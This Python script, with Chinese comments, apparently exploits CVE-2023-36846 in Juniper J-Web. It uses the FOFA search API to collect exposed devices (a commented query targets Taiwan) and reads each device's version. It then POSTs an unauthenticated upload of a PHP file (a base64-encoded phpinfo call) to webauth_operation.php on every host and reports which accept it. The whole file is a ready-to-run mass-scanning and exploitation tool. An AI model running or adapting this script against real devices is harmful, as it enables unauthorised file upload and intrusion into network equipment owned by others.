import base64, requests
from requests.packages import urllib3


# fofa 信息
def fofaInfo(headers):
    enmail = "" # Dreams.magic.fairy@yandex.com
    key = "" # c05c03101b068f8dd8199e9cc22fa230 假的
    query = '' # app="JUNIPer-Web-Device-Manager" && country="TW"
    qbase64 = base64.b64encode(query.encode()).decode()
    url = f"https://fofa.info/api/v1/search/all?email={enmail}&key={key}&qbase64={qbase64}"
    res_list = []
    r = requests.get(url, headers=headers)
    for i in (r.json()['results']):
        res_list.append(i[0])
    return res_list


# 版本探测
def verCheck(ip_list, headers):
    res_list = []
    urllib3.disable_warnings()  # 屏蔽 https 证书警告
    for i in ip_list:
        try:
            res = requests.get(f"{i}/device", headers=headers, verify=False)
            print(f"url: {i}, version: {res.json()['product_version']}")
            res_list.append(i)
        except:
            continue
    return res_list


# 检测 CVE-2023-36846
def vulnerable(headers, checkIp):
    data = 'rs=do_upload&rsargs[0]=[{"fileName":"test.php", "fileData":"PD9waHAgcGhwaW5mbygpOz8+", "csize":18}]'  # 构建 exp 数据
    target_ip = checkIp
    for target in target_ip:
        r = requests.post(f'{target}/webauth_operation.php', data=data,headers=headers,verify=False)
        if r.text == '-:function not callable':
            print(f'target: {target}, response: {r.text}, vulnerable: failed of CVE-2023-36846')
        if '+:{"converted_fileName' in r.text:
            print(f'target: {target}, response: {r.text}, vulnerable: success of CVE-2023-36846')


if __name__ == '__main__':
    headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}
    vulnerable(headers, verCheck(fofaInfo(headers), headers))
